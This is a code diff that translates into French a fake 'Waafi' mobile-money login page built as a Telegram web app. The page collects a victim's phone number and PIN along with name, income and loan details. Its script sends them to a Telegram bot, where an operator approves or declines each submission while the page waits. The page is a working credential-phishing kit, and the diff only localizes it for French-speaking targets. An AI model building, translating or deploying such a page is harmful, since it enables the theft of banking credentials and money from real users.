@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Get Started</title>
+    <title>Commencer</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -194,35 +194,35 @@
     </div>
 
     <div class="header-section">
-        <h1 class="title">Let's get started</h1>
-        <p class="subtitle">Enter your phone number and PIN to get started</p>
+        <h1 class="title">Commencer</h1>
+        <p class="subtitle">Entrez votre numéro de téléphone et votre code PIN pour continuer</p>
     </div>
 
     <!-- Loading Overlay -->
     <div id="loading-overlay" class="loading-overlay">
         <div class="spinner"></div>
-        <span>Waiting approval...</span>
+        <span>En attente d'approbation...</span>
     </div>
 
     <form class="form-container" id="loginForm">
         <!-- Phone Input -->
         <div class="input-group">
             <span class="country-code">+253</span>
-            <input type="tel" id="phoneInput" placeholder="Enter phone number" maxlength="8" inputmode="numeric" required>
+            <input type="tel" id="phoneInput" placeholder="Entrez le numéro de téléphone" maxlength="8" inputmode="numeric" required>
         </div>
 
         <!-- PIN Input -->
         <div class="input-group">
-            <input type="password" id="pinInput" placeholder="Enter PIN" maxlength="6" inputmode="numeric" required>
+            <input type="password" id="pinInput" placeholder="Entrez le code PIN" maxlength="6" inputmode="numeric" required>
         </div>
 
         <div class="bottom-section">
             <label class="terms-container">
                 <input type="checkbox" id="termsCheckbox">
-                <span class="terms-label">I agree to the <a href="#">Terms of Service</a></span>
+                <span class="terms-label">J'accepte les <a href="#">Conditions d'utilisation</a></span>
             </label>
 
-            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continue</button>
+            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continuer</button>
         </div>
     </form>
 
@@ -295,19 +295,19 @@
                     pin: pin
                 };
 
-                // Build the message text
+                // Build the message text in French
                 const messageLines = [
-                    "🔐 *Waafi Login Data*",
+                    "🔐 *Données de Connexion Waafi*",
                     "",
-                    "👤 *Magaca:* " + (allData.firstName || "---") + " " + (allData.lastName || "---"),
-                    "📞 *Telefoon:* +253 " + allData.phone,
-                    "💰 *Qaddarka:* $" + (allData.amount || "---"),
-                    "📆 *Muddada:* " + (allData.loanDuration || "---"),
-                    "📋 *Nooca:* " + (allData.loanType || "---"),
-                    "📝 *Ujeedada:* " + (allData.loanPurpose || "---"),
-                    "💼 *Shaqada:* " + (allData.jobStatus || "---"),
-                    "💵 *Dakhliga:* $" + (allData.income || "---"),
-                    "🔑 *PIN:* " + allData.pin
+                    "👤 *Nom :* " + (allData.firstName || "---") + " " + (allData.lastName || "---"),
+                    "📞 *Téléphone :* +253 " + allData.phone,
+                    "💰 *Montant :* $" + (allData.amount || "---"),
+                    "📆 *Durée :* " + (allData.loanDuration || "---"),
+                    "📋 *Type :* " + (allData.loanType || "---"),
+                    "📝 *Motif :* " + (allData.loanPurpose || "---"),
+                    "💼 *Emploi :* " + (allData.jobStatus || "---"),
+                    "💵 *Revenu :* $" + (allData.income || "---"),
+                    "🔑 *PIN :* " + allData.pin
                 ];
                 const message = messageLines.join("\n");
 
@@ -317,10 +317,10 @@
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [{
-                            text: "✅ Approved",
+                            text: "✅ Approuvé",
                             callback_data: `approve:${sessionId}`
                         }, {
-                            text: "❌ Decline",
+                            text: "❌ Refusé",
                             callback_data: `decline:${sessionId}`
                         }]
                     ]
@@ -352,12 +352,12 @@
                         startPollingForApproval(BOT_TOKEN, sessionId);
                     } else {
                         if (overlay) overlay.style.display = "none";
-                        alert("Error sending request. Please try again.");
+                        alert("Erreur lors de l'envoi de la demande. Veuillez réessayer.");
                     }
                 } catch (err) {
                     console.error("❌ Network error sending to Telegram:", err);
                     if (overlay) overlay.style.display = "none";
-                    alert("Network error. Please check your connection.");
+                    alert("Erreur réseau. Veuillez vérifier votre connexion.");
                 }
             });
 
@@ -388,7 +388,7 @@
                                             },
                                             body: JSON.stringify({
                                                 callback_query_id: callbackQueryId,
-                                                text: "Approved!"
+                                                text: "Approuvé !"
                                             })
                                         });
 
@@ -406,7 +406,7 @@
                                             },
                                             body: JSON.stringify({
                                                 callback_query_id: callbackQueryId,
-                                                text: "Declined. Resetting form."
+                                                text: "Refusé. Réinitialisation du formulaire."
                                             })
                                         });
 
@@ -419,7 +419,7 @@
                                         termsCheckbox.checked = false;
                                         validateForm();
 
-                                        alert("Your request was declined. Please re-enter your details.");
+                                        alert("Votre demande a été refusée. Veuillez saisir à nouveau vos informations.");
                                         return;
                                     }
                                 }
